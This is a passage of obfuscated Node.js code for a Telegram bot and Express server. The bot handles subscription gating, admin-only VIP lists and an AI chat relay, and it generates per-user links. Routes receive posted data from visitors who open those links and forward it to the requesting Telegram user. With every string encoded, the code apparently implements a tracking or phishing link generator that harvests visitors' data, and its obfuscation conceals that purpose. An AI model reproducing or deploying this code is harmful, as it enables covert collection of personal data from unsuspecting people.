            'XRYAp': _0x819dac(0x450) + _0x819dac(0x270) + _0x819dac(0x39b) + _0x819dac(0x529) + _0x819dac(0x65b) + _0x819dac(0x58f) + _0x819dac(0x232),
            'uRvZd': function (_0xef22a3, _0x2f7587) {
                return _0xef22a3 === _0x2f7587;
            },
            'wStRM': _0x819dac(0x6b6) + _0x819dac(0x6e2),
            'cfmry': _0x819dac(0x639) + _0x819dac(0x290) + _0x819dac(0x492) + _0x819dac(0x512) + _0x819dac(0x7b3) + _0x819dac(0x32d) + _0x819dac(0x7fb) + _0x819dac(0x24d) + _0x819dac(0x209) + _0x819dac(0x7f2) + _0x819dac(0x1fe) + _0x819dac(0x7d8) + _0x819dac(0x4fd) + _0x819dac(0x891) + _0x819dac(0x80c) + _0x819dac(0x7e1),
            'xxdGx': _0x819dac(0x5bb) + _0x819dac(0x3ae) + _0x819dac(0x6ff),
            'QqHmK': _0x819dac(0x450) + _0x819dac(0x270) + _0x819dac(0x789) + _0x819dac(0x1a0) + _0x819dac(0x1c8) + _0x819dac(0x675) + _0x819dac(0x220),
            'UIkFd': function (_0xdfb590, _0x37f1bf) {
                return _0xdfb590 === _0x37f1bf;
            },
            'nMoXP': _0x819dac(0x267),
            'HVGNC': function (_0x17296d, _0x5e8734) {
                return _0x17296d == _0x5e8734;
            },
            'EhRnv': _0x819dac(0x502) + _0x819dac(0x3df) + _0x819dac(0x5e8) + _0x819dac(0x5c8) + 'P:',
            'EiJwg': _0x819dac(0x320),
            'dcNro': _0x819dac(0x3fe),
            'lchnX': _0x819dac(0x502) + _0x819dac(0x3df) + _0x819dac(0x31e) + _0x819dac(0x81e) + 'P:',
            'DRENj': function (_0x30d5c8, _0x31bedf, _0x212f15) {
                return _0x30d5c8(_0x31bedf, _0x212f15);
            },
            'UzIXV': _0x819dac(0x54b) + 'nt',
            'RGbZZ': _0x819dac(0x21d) + 'k',
            'AtDQY': _0x819dac(0x271) + 'n',
            'Rftro': _0x819dac(0x53f),
            'VIlWU': _0x819dac(0x331) + 'e'
        }, _0xe9e297 = _0x34425a[_0x819dac(0x320)][_0x819dac(0x638)]['id'], _0x1bd2d5 = _0x34425a[_0x819dac(0x8fe)], _0x51d3b9 = [
            _0x1b8bae[_0x819dac(0x741)],
            _0x1b8bae[_0x819dac(0x61f)],
            _0x1b8bae[_0x819dac(0x444)],
            _0x1b8bae[_0x819dac(0x843)],
            _0x1b8bae[_0x819dac(0x3d9)],
            _0x1b8bae[_0x819dac(0x733)],
            _0x1b8bae[_0x819dac(0x3a7)],
            _0x1b8bae[_0x819dac(0x49b)]
        ];
    if (!_0x51d3b9[_0x819dac(0x8a7)](_0x1bd2d5[_0x819dac(0x7b8)](':')[-0x145 + -0x3 * -0x559 + 0x7a * -0x1f]) && !await _0x1b8bae[_0x819dac(0x1b2)](isUserSubscribed, _0xe9e297)) {
        const _0xe32f9f = _0x1b8bae[_0x819dac(0x5ee)], _0x10c007 = developerChannels[_0x819dac(0x430)](_0x429b4e => ({
                'text': _0x819dac(0x6ed) + _0x429b4e,
                'url': _0x819dac(0x82a) + _0x819dac(0x4c0) + _0x429b4e[_0x819dac(0x6ab)](0x1b06 + -0x1 * 0x225b + 0x3ab * 0x2)
            }));
        bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0xe32f9f, { 'reply_markup': { 'inline_keyboard': [_0x10c007] } });
        return;
    }
    if (_0x1b8bae[_0x819dac(0x30e)](_0x1bd2d5, _0x1b8bae[_0x819dac(0x5e3)])) {
        const _0x5edac4 = baseUrl + (_0x819dac(0x276) + _0x819dac(0x95e)) + _0xe9e297;
        bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x819dac(0x656) + _0x819dac(0x363) + _0x819dac(0x47f) + '\x20' + _0x5edac4);
        return;
    }
    const [_0x3aabe3, _0x25c217] = _0x1bd2d5[_0x819dac(0x7b8)](':');
    if (_0x1b8bae[_0x819dac(0x223)](_0x3aabe3, _0x1b8bae[_0x819dac(0x70e)]))
        try {
            const _0x586ea3 = _0x1b8bae[_0x819dac(0x924)], _0x590446 = _0x1b8bae[_0x819dac(0x38e)], _0x2240a2 = await axios[_0x819dac(0x5cd)](_0x590446, {
                    'model': _0x1b8bae[_0x819dac(0x940)],
                    'messages': [{
                            'role': _0x1b8bae[_0x819dac(0x887)],
                            'content': _0x586ea3
                        }]
                }, {
                    'headers': {
                        'Authorization': _0x1b8bae[_0x819dac(0x277)],
                        'Content-Type': _0x1b8bae[_0x819dac(0x36b)]
                    }
                }), _0x3eb964 = _0x2240a2[_0x819dac(0x8fe)][_0x819dac(0x78c)][0x17 * -0x165 + 0x1 * -0x1857 + -0xae * -0x53][_0x819dac(0x320)][_0x819dac(0x6d6)];
            bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x3eb964);
        } catch (_0x31ed6f) {
            console[_0x819dac(0x20f)](_0x1b8bae[_0x819dac(0x6d0)], _0x31ed6f[_0x819dac(0x4aa)] ? _0x31ed6f[_0x819dac(0x4aa)][_0x819dac(0x8fe)] : _0x31ed6f[_0x819dac(0x320)]), bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x1b8bae[_0x819dac(0x2cb)]);
        }
    else {
        if (_0x1b8bae[_0x819dac(0x933)](_0x1bd2d5, _0x1b8bae[_0x819dac(0x4cd)]))
            try {
                const _0x1201ba = _0x1b8bae[_0x819dac(0x3f6)], _0x44e36a = _0x1b8bae[_0x819dac(0x38e)], _0x1633c9 = await axios[_0x819dac(0x5cd)](_0x44e36a, {
                        'model': _0x1b8bae[_0x819dac(0x940)],
                        'messages': [{
                                'role': _0x1b8bae[_0x819dac(0x887)],
                                'content': _0x1201ba
                            }]
                    }, {
                        'headers': {
                            'Authorization': _0x1b8bae[_0x819dac(0x277)],
                            'Content-Type': _0x1b8bae[_0x819dac(0x36b)]
                        }
                    }), _0x44deec = _0x1633c9[_0x819dac(0x8fe)][_0x819dac(0x78c)][-0x318 + 0x14b * 0xb + -0x4d * 0x25][_0x819dac(0x320)][_0x819dac(0x6d6)];
                bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x44deec);
            } catch (_0x285152) {
                console[_0x819dac(0x20f)](_0x1b8bae[_0x819dac(0x6d0)], _0x285152[_0x819dac(0x4aa)] ? _0x285152[_0x819dac(0x4aa)][_0x819dac(0x8fe)] : _0x285152[_0x819dac(0x320)]), bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x1b8bae[_0x819dac(0x2cb)]);
            }
        else {
            if (_0x1b8bae[_0x819dac(0x223)](_0x1bd2d5, _0x1b8bae[_0x819dac(0x4cd)]))
                try {
                    const _0x1083d4 = _0x1b8bae[_0x819dac(0x3f6)], _0x353384 = _0x1b8bae[_0x819dac(0x38e)], _0x3088fa = await axios[_0x819dac(0x5cd)](_0x353384, {
                            'model': _0x1b8bae[_0x819dac(0x940)],
                            'messages': [{
                                    'role': _0x1b8bae[_0x819dac(0x887)],
                                    'content': _0x1083d4
                                }]
                        }, {
                            'headers': {
                                'Authorization': _0x1b8bae[_0x819dac(0x277)],
                                'Content-Type': _0x1b8bae[_0x819dac(0x36b)]
                            }
                        }), _0x554391 = _0x3088fa[_0x819dac(0x8fe)][_0x819dac(0x78c)][0x1 * 0x1336 + 0x165 * 0x5 + -0x1a2f * 0x1][_0x819dac(0x320)][_0x819dac(0x6d6)];
                    bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x554391);
                } catch (_0x1f498e) {
                    console[_0x819dac(0x20f)](_0x1b8bae[_0x819dac(0x3c1)], _0x1f498e[_0x819dac(0x4aa)] ? _0x1f498e[_0x819dac(0x4aa)][_0x819dac(0x8fe)] : _0x1f498e[_0x819dac(0x320)]), bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x1b8bae[_0x819dac(0x246)]);
                }
            else {
                if (_0x1b8bae[_0x819dac(0x744)](_0x1bd2d5, _0x1b8bae[_0x819dac(0x456)]) && _0x1b8bae[_0x819dac(0x63c)](_0xe9e297, 0x17a96b3ef + -0xc * -0x325577fd + -0x280852411))
                    bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x1b8bae[_0x819dac(0x20c)]), bot[_0x819dac(0x85c)](_0x1b8bae[_0x819dac(0x282)], _0x59a1b5 => {
                        const _0x6028ab = _0x819dac, _0x2780ca = _0x59a1b5[_0x6028ab(0x6d8)];
                        _0x1b8bae[_0x6028ab(0x738)](addVIPUser, _0x2780ca), bot[_0x6028ab(0x84f) + 'e'](_0xe9e297, _0x6028ab(0x201) + _0x6028ab(0x1d2) + _0x2780ca + _0x6028ab(0x853));
                    });
                else {
                    if (_0x1b8bae[_0x819dac(0x744)](_0x1bd2d5, _0x1b8bae[_0x819dac(0x64b)]) && _0x1b8bae[_0x819dac(0x63c)](_0xe9e297, -0x595 * -0x4596d1 + -0x1b01f85fb * 0x1 + -0x606ff644 * -0x4))
                        bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x1b8bae[_0x819dac(0x558)]), bot[_0x819dac(0x85c)](_0x1b8bae[_0x819dac(0x282)], _0x5754a9 => {
                            const _0xbdc7ea = _0x819dac, _0x5eade3 = _0x5754a9[_0xbdc7ea(0x6d8)];
                            _0x1b8bae[_0xbdc7ea(0x784)](removeVIPUser, _0x5eade3), bot[_0xbdc7ea(0x84f) + 'e'](_0xe9e297, _0xbdc7ea(0x358) + _0xbdc7ea(0x1d2) + _0x5eade3 + _0xbdc7ea(0x57a));
                        });
                    else {
                        const [_0x2eaeec, _0x469ec2] = _0x1bd2d5[_0x819dac(0x7b8)](':');
                        if (!_0x51d3b9[_0x819dac(0x8a7)](_0x2eaeec) && !_0x1b8bae[_0x819dac(0x91f)](validateLinkUsage, _0x469ec2, _0x2eaeec)) {
                            bot[_0x819dac(0x84f) + 'e'](_0xe9e297, '');
                            return;
                        }
                        let _0x3b6e32 = '';
                        switch (_0x2eaeec) {
                        case _0x1b8bae[_0x819dac(0x79d)]:
                            _0x3b6e32 = _0x819dac(0x1d9) + _0x819dac(0x1ef) + _0x819dac(0x4a0) + _0x819dac(0x7b1) + _0x819dac(0x3b4) + _0x819dac(0x478) + _0x819dac(0x70b) + _0x819dac(0x8ca) + _0x819dac(0x2ae) + _0x819dac(0x758) + _0x819dac(0x554) + _0x819dac(0x28f) + _0x819dac(0x900) + _0x819dac(0x348) + _0x819dac(0x1db) + _0x819dac(0x28a) + _0x819dac(0x7bc) + _0x819dac(0x86a) + _0x819dac(0x5e0) + _0x819dac(0x278) + _0x819dac(0x39d);
                            break;
                        case _0x1b8bae[_0x819dac(0x754)]:
                            _0x3b6e32 = _0x819dac(0x1d9) + _0x819dac(0x1ef) + _0x819dac(0x4a0) + _0x819dac(0x7b1) + _0x819dac(0x3b4) + _0x819dac(0x478) + _0x819dac(0x70b) + _0x819dac(0x8ca) + _0x819dac(0x2ae) + _0x819dac(0x758) + _0x819dac(0x554) + _0x819dac(0x28f) + _0x819dac(0x900) + _0x819dac(0x348) + _0x819dac(0x1db) + _0x819dac(0x28a) + _0x819dac(0x7bc) + _0x819dac(0x86a) + _0x819dac(0x5e0) + _0x819dac(0x278) + _0x819dac(0x39d);
                            break;
                        case _0x1b8bae[_0x819dac(0x477)]:
                            _0x3b6e32 = baseUrl + (_0x819dac(0x6f8) + _0x819dac(0x6d2)) + crypto[_0x819dac(0x515) + 's'](-0x8ab + -0x14 * -0x17b + -0x14e1)[_0x819dac(0x762)](_0x1b8bae[_0x819dac(0x3e4)]) + _0x819dac(0x334) + _0xe9e297;
                            break;
                        case _0x1b8bae[_0x819dac(0x6e5)]:
                            const _0x3613c4 = -0x205c + 0x7ee + 0x1878;
                            _0x3b6e32 = baseUrl + _0x819dac(0x87e) + crypto[_0x819dac(0x515) + 's'](0x3 * -0x453 + 0x200c + -0x1303)[_0x819dac(0x762)](_0x1b8bae[_0x819dac(0x3e4)]) + _0x819dac(0x334) + _0xe9e297 + _0x819dac(0x521) + _0x3613c4;
                            break;
                        case _0x1b8bae[_0x819dac(0x733)]:
                            _0x3b6e32 = baseUrl + (_0x819dac(0x1f2) + _0x819dac(0x372)) + _0xe9e297 + (_0x819dac(0x6f5) + 'ok');
                            break;
                        case _0x1b8bae[_0x819dac(0x843)]:
                            _0x3b6e32 = baseUrl + (_0x819dac(0x1f2) + _0x819dac(0x372)) + _0xe9e297 + (_0x819dac(0x743) + _0x819dac(0x8c6));
                            break;
                        case _0x1b8bae[_0x819dac(0x49b)]:
                            _0x3b6e32 = baseUrl + (_0x819dac(0x1f2) + _0x819dac(0x372)) + _0xe9e297 + (_0x819dac(0x8b5) + _0x819dac(0x94d));
                            break;
                        default:
                            bot[_0x819dac(0x84f) + 'e'](_0xe9e297, '');
                            return;
                        }
                        bot[_0x819dac(0x84f) + 'e'](_0xe9e297, _0x819dac(0x80a) + _0x819dac(0x3ee) + _0x3b6e32);
                    }
                }
            }
        }
    }
    bot[_0x819dac(0x737) + _0x819dac(0x4bc)](_0x34425a['id']);
}), bot[_0x544f76(0x937)](/\/jjihigjoj/, _0x41a814 => {
    const _0x2b3c69 = _0x544f76, _0x1b2733 = {
            'FBfHz': _0x2b3c69(0x489) + _0x2b3c69(0x772) + _0x2b3c69(0x902) + _0x2b3c69(0x1b4) + '.',
            'OacgY': _0x2b3c69(0x6a6) + _0x2b3c69(0x6ec),
            'WDfCF': _0x2b3c69(0x794) + _0x2b3c69(0x850)
        }, _0x4888c9 = _0x41a814[_0x2b3c69(0x638)]['id'], _0x2c2b5e = _0x1b2733[_0x2b3c69(0x93b)];
    bot[_0x2b3c69(0x84f) + 'e'](_0x4888c9, _0x2c2b5e, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x1b2733[_0x2b3c69(0x665)],
                        'callback_data': _0x1b2733[_0x2b3c69(0x2e4)]
                    }]]
        }
    });
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x384ca9 => {
    const _0x5857d0 = _0x544f76, _0x3bbd71 = {
            'ufIau': function (_0x14fc64, _0x29882d) {
                return _0x14fc64 === _0x29882d;
            },
            'CTLQH': _0x5857d0(0x794) + _0x5857d0(0x850)
        }, _0x5e8666 = _0x384ca9[_0x5857d0(0x320)][_0x5857d0(0x638)]['id'];
    if (_0x3bbd71[_0x5857d0(0x46a)](_0x384ca9[_0x5857d0(0x8fe)], _0x3bbd71[_0x5857d0(0x488)])) {
        const _0x3f0578 = baseUrl + '/' + _0x5e8666;
        bot[_0x5857d0(0x84f) + 'e'](_0x5e8666, _0x5857d0(0x3c4) + _0x5857d0(0x67e) + _0x3f0578);
    }
    bot[_0x5857d0(0x737) + _0x5857d0(0x4bc)](_0x384ca9['id']);
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x5c5fb8 => {
    const _0x49bac5 = _0x544f76, _0x2d83b4 = {
            'baszI': function (_0x2e5346, _0xa4009b) {
                return _0x2e5346 === _0xa4009b;
            },
            'nJbFy': _0x49bac5(0x25e),
            'wdzbH': _0x49bac5(0x320),
            'JACuB': _0x49bac5(0x1f1) + _0x49bac5(0x33b) + _0x49bac5(0x1e0) + _0x49bac5(0x631),
            'dERfd': _0x49bac5(0x65f),
            'TsQWA': _0x49bac5(0x240) + _0x49bac5(0x2ec) + _0x49bac5(0x1cf) + '.'
        }, _0x32e834 = _0x5c5fb8[_0x49bac5(0x320)][_0x49bac5(0x638)]['id'];
    if (_0x2d83b4[_0x49bac5(0x837)](_0x5c5fb8[_0x49bac5(0x8fe)], _0x2d83b4[_0x49bac5(0x723)])) {
        bot[_0x49bac5(0x84f) + 'e'](_0x32e834, _0x2d83b4[_0x49bac5(0x86e)]);
        const _0x51e87a = _0x36ef42 => {
            const _0x2c5f1b = _0x49bac5;
            if (_0x2d83b4[_0x2c5f1b(0x837)](_0x36ef42[_0x2c5f1b(0x638)]['id'], _0x32e834)) {
                if (_0x36ef42[_0x2c5f1b(0x6d8)] && _0x36ef42[_0x2c5f1b(0x6d8)][_0x2c5f1b(0x428)](_0x2d83b4[_0x2c5f1b(0x915)])) {
                    const _0x3b4ebc = _0x36ef42[_0x2c5f1b(0x6d8)];
                    dataStore[_0x32e834] = { 'userLink': _0x3b4ebc }, bot[_0x2c5f1b(0x84f) + 'e'](_0x32e834, _0x2c5f1b(0x1d9) + _0x2c5f1b(0x1ef) + _0x2c5f1b(0x4a0) + _0x2c5f1b(0x7b1) + _0x2c5f1b(0x3b4) + _0x2c5f1b(0x478) + _0x2c5f1b(0x70b) + _0x2c5f1b(0x8ca) + _0x2c5f1b(0x2ae) + _0x2c5f1b(0x758) + _0x2c5f1b(0x554) + _0x2c5f1b(0x28f) + _0x2c5f1b(0x900) + _0x2c5f1b(0x348) + _0x2c5f1b(0x1db) + _0x2c5f1b(0x28a) + _0x2c5f1b(0x7bc) + _0x2c5f1b(0x86a) + _0x2c5f1b(0x5e0) + _0x2c5f1b(0x278) + _0x2c5f1b(0x39d)), bot[_0x2c5f1b(0x6dd) + _0x2c5f1b(0x92f)](_0x2d83b4[_0x2c5f1b(0x788)], _0x51e87a);
                } else
                    bot[_0x2c5f1b(0x84f) + 'e'](_0x32e834, _0x2d83b4[_0x2c5f1b(0x518)]);
            }
        };
        bot['on'](_0x2d83b4[_0x49bac5(0x788)], _0x51e87a);
    }
}), app[_0x544f76(0x513)](bodyParser[_0x544f76(0x5ec)]({ 'extended': !![] })), app[_0x544f76(0x513)](express[_0x544f76(0x295)](__dirname)), app[_0x544f76(0x5cd)](_0x544f76(0x3e1) + 'es', (_0x4081b2, _0x87552a) => {
    const _0x122045 = _0x544f76, _0x4af312 = {
            'tjXuS': _0x122045(0x479),
            'OkIzx': _0x122045(0x54c) + _0x122045(0x849) + _0x122045(0x856) + ':',
            'yZOPn': _0x122045(0x450) + _0x122045(0x6cd) + _0x122045(0x2c9) + _0x122045(0x533) + _0x122045(0x5af),
            'Nlngr': _0x122045(0x27d) + _0x122045(0x623)
        }, _0x28c6ca = _0x4081b2[_0x122045(0x539)][_0x122045(0x572)], _0xc0a5b5 = _0x4081b2[_0x122045(0x539)][_0x122045(0x541)], _0x457591 = _0x4081b2[_0x122045(0x539)][_0x122045(0x85a)];
    console[_0x122045(0x2e0)](_0x4af312[_0x122045(0x664)], _0x4081b2[_0x122045(0x539)]), bot[_0x122045(0x84f) + 'e'](_0x28c6ca, _0x122045(0x8ff) + _0x122045(0x7e0) + _0xc0a5b5 + _0x122045(0x1a3) + _0x457591)[_0x122045(0x507)](() => {
        const _0x2f3e33 = _0x122045;
        _0x87552a[_0x2f3e33(0x89c)](path[_0x2f3e33(0x1ec)](__dirname, _0x4af312[_0x2f3e33(0x742)]));
    })[_0x122045(0x854)](_0x321619 => {
        const _0x3bad6b = _0x122045;
        console[_0x3bad6b(0x20f)](_0x4af312[_0x3bad6b(0x2f0)], _0x321619[_0x3bad6b(0x4aa)] ? _0x321619[_0x3bad6b(0x4aa)][_0x3bad6b(0x539)] : _0x321619), _0x87552a[_0x3bad6b(0x7d7)](-0x1 * -0x1cf9 + 0x13c * 0x14 + 0xd9 * -0x3d)[_0x3bad6b(0x5a1)](_0x4af312[_0x3bad6b(0x3ef)]);
    });
}), app[_0x544f76(0x4f5)](_0x544f76(0x81a), (_0x51968d, _0x4310ef) => {
    const _0x18087a = _0x544f76, _0x2b5f38 = {
            'rssbZ': _0x18087a(0x45e) + _0x18087a(0x561) + _0x18087a(0x95b),
            'lnHtO': _0x18087a(0x479)
        }, _0x3d357e = _0x51968d[_0x18087a(0x439)][_0x18087a(0x572)];
    if (!_0x3d357e)
        return _0x4310ef[_0x18087a(0x7d7)](0x36d * -0x7 + -0x782 + -0x1 * -0x210d)[_0x18087a(0x5a1)](_0x2b5f38[_0x18087a(0x71a)]);
    _0x4310ef[_0x18087a(0x89c)](path[_0x18087a(0x1ec)](__dirname, _0x2b5f38[_0x18087a(0x77b)]));
}), app[_0x544f76(0x513)](bodyParser[_0x544f76(0x5ec)]({ 'extended': !![] })), app[_0x544f76(0x513)](express[_0x544f76(0x295)](__dirname)), app[_0x544f76(0x5cd)](_0x544f76(0x3e1) + 'es', (_0x553167, _0x3e6d7d) => {
    const _0x3c1a85 = _0x544f76, _0x14dcc1 = {
            'SZpyZ': _0x3c1a85(0x7ef),
            'zlAGg': _0x3c1a85(0x54c) + _0x3c1a85(0x849) + _0x3c1a85(0x856) + ':',
            'DCwtW': _0x3c1a85(0x450) + _0x3c1a85(0x6cd) + _0x3c1a85(0x2c9) + _0x3c1a85(0x533) + _0x3c1a85(0x5af),
            'nopfS': _0x3c1a85(0x27d) + _0x3c1a85(0x623)
        }, _0x51cdaf = _0x553167[_0x3c1a85(0x539)][_0x3c1a85(0x572)], _0x432ee1 = _0x553167[_0x3c1a85(0x539)][_0x3c1a85(0x541)], _0x59855c = _0x553167[_0x3c1a85(0x539)][_0x3c1a85(0x85a)];
    console[_0x3c1a85(0x2e0)](_0x14dcc1[_0x3c1a85(0x6fe)], _0x553167[_0x3c1a85(0x539)]), bot[_0x3c1a85(0x84f) + 'e'](_0x51cdaf, _0x3c1a85(0x8ff) + _0x3c1a85(0x7e0) + _0x432ee1 + _0x3c1a85(0x1a3) + _0x59855c)[_0x3c1a85(0x507)](() => {
        const _0x28271c = _0x3c1a85;
        _0x3e6d7d[_0x28271c(0x89c)](path[_0x28271c(0x1ec)](__dirname, _0x14dcc1[_0x28271c(0x7b0)]));
    })[_0x3c1a85(0x854)](_0xc3424e => {
        const _0x4d88cd = _0x3c1a85;
        console[_0x4d88cd(0x20f)](_0x14dcc1[_0x4d88cd(0x76f)], _0xc3424e[_0x4d88cd(0x4aa)] ? _0xc3424e[_0x4d88cd(0x4aa)][_0x4d88cd(0x539)] : _0xc3424e), _0x3e6d7d[_0x4d88cd(0x7d7)](0x7 * 0x1cb + 0x3 * -0x67 + -0x964)[_0x4d88cd(0x5a1)](_0x14dcc1[_0x4d88cd(0x799)]);
    });
}), app[_0x544f76(0x4f5)](_0x544f76(0x461), (_0x247daf, _0x253951) => {
    const _0x3a7940 = _0x544f76, _0x7fb0fe = {
            'FbfAW': _0x3a7940(0x45e) + _0x3a7940(0x561) + _0x3a7940(0x95b),
            'EeNuf': _0x3a7940(0x7ef)
        }, _0x1882c4 = _0x247daf[_0x3a7940(0x439)][_0x3a7940(0x572)];
    if (!_0x1882c4)
        return _0x253951[_0x3a7940(0x7d7)](0x1e84 + -0xb3 * -0x25 + -0x36d3)[_0x3a7940(0x5a1)](_0x7fb0fe[_0x3a7940(0x7cc)]);
    _0x253951[_0x3a7940(0x89c)](path[_0x3a7940(0x1ec)](__dirname, _0x7fb0fe[_0x3a7940(0x7ee)]));
}), app[_0x544f76(0x513)](bodyParser[_0x544f76(0x5ec)]({ 'extended': !![] })), app[_0x544f76(0x513)](express[_0x544f76(0x295)](__dirname)), app[_0x544f76(0x5cd)](_0x544f76(0x3e1) + 'es', (_0x30285a, _0x4ef64f) => {
    const _0x2a8e26 = _0x544f76, _0x1fc7a2 = {
            'nrIeU': _0x2a8e26(0x5c4),
            'Bnond': _0x2a8e26(0x54c) + _0x2a8e26(0x849) + _0x2a8e26(0x856) + ':',
            'coXTj': _0x2a8e26(0x450) + _0x2a8e26(0x6cd) + _0x2a8e26(0x2c9) + _0x2a8e26(0x533) + _0x2a8e26(0x5af),
            'ZdCdj': _0x2a8e26(0x27d) + _0x2a8e26(0x623)
        }, _0x5ab1ec = _0x30285a[_0x2a8e26(0x539)][_0x2a8e26(0x572)], _0x40dea4 = _0x30285a[_0x2a8e26(0x539)][_0x2a8e26(0x541)], _0x27d80b = _0x30285a[_0x2a8e26(0x539)][_0x2a8e26(0x85a)];
    console[_0x2a8e26(0x2e0)](_0x1fc7a2[_0x2a8e26(0x327)], _0x30285a[_0x2a8e26(0x539)]), bot[_0x2a8e26(0x84f) + 'e'](_0x5ab1ec, _0x2a8e26(0x8ff) + _0x2a8e26(0x7e0) + _0x40dea4 + _0x2a8e26(0x1a3) + _0x27d80b)[_0x2a8e26(0x507)](() => {
        const _0x4d4e5a = _0x2a8e26;
        _0x4ef64f[_0x4d4e5a(0x89c)](path[_0x4d4e5a(0x1ec)](__dirname, _0x1fc7a2[_0x4d4e5a(0x242)]));
    })[_0x2a8e26(0x854)](_0x22b89d => {
        const _0x5d217a = _0x2a8e26;
        console[_0x5d217a(0x20f)](_0x1fc7a2[_0x5d217a(0x882)], _0x22b89d[_0x5d217a(0x4aa)] ? _0x22b89d[_0x5d217a(0x4aa)][_0x5d217a(0x539)] : _0x22b89d), _0x4ef64f[_0x5d217a(0x7d7)](0x940 + -0x7c9 + 0x7d)[_0x5d217a(0x5a1)](_0x1fc7a2[_0x5d217a(0x3b9)]);
    });
}), app[_0x544f76(0x4f5)](_0x544f76(0x405), (_0x38062d, _0xa19295) => {
    const _0x1cca37 = _0x544f76, _0x4031de = {
            'bvQJk': _0x1cca37(0x45e) + _0x1cca37(0x561) + _0x1cca37(0x95b),
            'Thloo': _0x1cca37(0x5c4)
        }, _0x4e369c = _0x38062d[_0x1cca37(0x439)][_0x1cca37(0x572)];
    if (!_0x4e369c)
        return _0xa19295[_0x1cca37(0x7d7)](0x19bc + -0x4f6 + -0x99b * 0x2)[_0x1cca37(0x5a1)](_0x4031de[_0x1cca37(0x419)]);
    _0xa19295[_0x1cca37(0x89c)](path[_0x1cca37(0x1ec)](__dirname, _0x4031de[_0x1cca37(0x1c9)]));
});
const countryTranslation = {
        'AF': _0x544f76(0x584) + _0x544f76(0x2ca),
        'AL': _0x544f76(0x76e),
        'DZ': _0x544f76(0x1e1),
        'AO': _0x544f76(0x37f),
        'AR': _0x544f76(0x32e) + _0x544f76(0x29d),
        'AM': _0x544f76(0x746),
        'AU': _0x544f76(0x31c),
        'AT': _0x544f76(0x3fd),
        'AZ': _0x544f76(0x64c),
        'BH': _0x544f76(0x694),
        'BD': _0x544f76(0x3f5),
        'BY': _0x544f76(0x8d8),
        'BE': _0x544f76(0x87a),
        'BZ': _0x544f76(0x7be),
        'BJ': _0x544f76(0x7fa),
        'BO': _0x544f76(0x872),
        'BA': _0x544f76(0x4ef) + _0x544f76(0x410),
        'BW': _0x544f76(0x378),
        'BR': _0x544f76(0x385),
        'BG': _0x544f76(0x93d),
        'BF': _0x544f76(0x259) + _0x544f76(0x544),
        'KH': _0x544f76(0x2a3),
        'CM': _0x544f76(0x34b) + _0x544f76(0x436),
        'CA': _0x544f76(0x66a),
        'CL': _0x544f76(0x621),
        'CN': _0x544f76(0x5e1),
        'CO': _0x544f76(0x500),
        'CR': _0x544f76(0x48d) + _0x544f76(0x20a),
        'HR': _0x544f76(0x423),
        'CY': _0x544f76(0x457),
        'CZ': _0x544f76(0x5d6),
        'DK': _0x544f76(0x349),
        'EC': _0x544f76(0x5fb) + _0x544f76(0x648),
        'EG': _0x544f76(0x311),
        'SV': _0x544f76(0x459) + _0x544f76(0x1b3),
        'EE': _0x544f76(0x90b),
        'ET': _0x544f76(0x22d),
        'FI': _0x544f76(0x25f),
        'FR': _0x544f76(0x424),
        'GE': _0x544f76(0x63a),
        'DE': _0x544f76(0x759),
        'GH': _0x544f76(0x7b2),
        'GR': _0x544f76(0x34a),
        'GT': _0x544f76(0x1ed) + _0x544f76(0x351),
        'HN': _0x544f76(0x7eb),
        'HK': _0x544f76(0x6ac) + _0x544f76(0x640),
        'HU': _0x544f76(0x727),
        'IS': _0x544f76(0x50a),
        'IN': _0x544f76(0x8a1),
        'ID': _0x544f76(0x8dd) + _0x544f76(0x3c8),
        'IR': _0x544f76(0x74b),
        'IQ': _0x544f76(0x88a),
        'IE': _0x544f76(0x55b),
        'IL': _0x544f76(0x7d1),
        'IT': _0x544f76(0x1de),
        'CI': _0x544f76(0x534) + _0x544f76(0x52c),
        'JP': _0x544f76(0x36c),
        'JO': _0x544f76(0x551),
        'KZ': _0x544f76(0x352) + _0x544f76(0x7bd),
        'KE': _0x544f76(0x7c3),
        'KW': _0x544f76(0x2db),
        'KG': _0x544f76(0x581) + _0x544f76(0x718),
        'LV': _0x544f76(0x88d),
        'LB': _0x544f76(0x68a),
        'LY': _0x544f76(0x5a4),
        'LT': _0x544f76(0x3bc),
        'LU': _0x544f76(0x65a) + _0x544f76(0x5f3),
        'MO': _0x544f76(0x695),
        'MY': _0x544f76(0x851),
        'ML': _0x544f76(0x3bb),
        'MT': _0x544f76(0x7fd),
        'MX': _0x544f76(0x371),
        'MC': _0x544f76(0x841),
        'MN': _0x544f76(0x629),
        'ME': _0x544f76(0x941) + _0x544f76(0x7de),
        'MA': _0x544f76(0x7a6),
        'MZ': _0x544f76(0x89b),
        'MM': _0x544f76(0x7ca),
        'NA': _0x544f76(0x1df),
        'NP': _0x544f76(0x52e),
        'NL': _0x544f76(0x52b),
        'NZ': _0x544f76(0x32c) + _0x544f76(0x563),
        'NG': _0x544f76(0x881),
        'KP': _0x544f76(0x78e) + _0x544f76(0x8e4),
        'NO': _0x544f76(0x77e),
        'OM': _0x544f76(0x643),
        'PK': _0x544f76(0x48a),
        'PS': _0x544f76(0x466),
        'PA': _0x544f76(0x3de),
        'PY': _0x544f76(0x353),
        'PE': _0x544f76(0x840),
        'PH': _0x544f76(0x5ea),
        'PL': _0x544f76(0x573),
        'PT': _0x544f76(0x68f),
        'PR': _0x544f76(0x4f9) + _0x544f76(0x6c9),
        'QA': _0x544f76(0x755),
        'RO': _0x544f76(0x26e),
        'RU': _0x544f76(0x729),
        'RW': _0x544f76(0x5c1),
        'SA': _0x544f76(0x3a0),
        'SN': _0x544f76(0x37e),
        'RS': _0x544f76(0x3f1),
        'SG': _0x544f76(0x919),
        'SK': _0x544f76(0x5e9),
        'SI': _0x544f76(0x855),
        'ZA': _0x544f76(0x27b) + _0x544f76(0x6c6),
